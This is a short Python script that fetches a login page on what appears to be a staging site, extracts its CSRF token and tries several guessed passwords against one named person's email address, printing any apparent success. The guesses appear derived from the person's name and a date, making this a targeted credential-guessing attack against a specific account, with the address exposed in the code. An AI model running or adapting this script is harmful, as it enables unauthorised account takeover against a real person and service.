import requests
import re

# Potential passwords to test
passwords_to_try = [
    'Camis110596#',
    'Camila110596#',
    'Adorno110596#',
    'Camis123#',
]

email = 'adornescamila@gmail.com'

session = requests.Session()

# Get login page
login_page = session.get('https://staging.espressoapp.com.br/users/sign_in', timeout=10)
print('[*] Got login page, parsing CSRF token...')

# Extract CSRF token
token_match = re.search(r'name="authenticity_token" value="([^"]+)"', login_page.text)
csrf_token = token_match.group(1) if token_match else ''
print('[*] CSRF Token found: ' + csrf_token[:30] + '...')

# Try each password
for pwd in passwords_to_try:
    login_data = {
        'user[email]': email,
        'user[password]': pwd,
        'user[remember_me]': '0',
        'commit': 'Login',
        'authenticity_token': csrf_token
    }
    
    try:
        response = session.post('https://staging.espressoapp.com.br/users/sign_in', data=login_data, timeout=10)
        print('[*] Testing: ' + pwd + ' - Status: ' + str(response.status_code))
        
        # Check for successful login
        if 'dashboard' in response.url or 'logout' in response.text or 'Account' in response.text:
            print('[+] POTENTIAL SUCCESS: ' + pwd)
            print('[*] URL: ' + response.url)
            print('[*] Response snippet: ' + response.text[:500])
            
    except Exception as e:
        print('[-] Error: ' + str(e))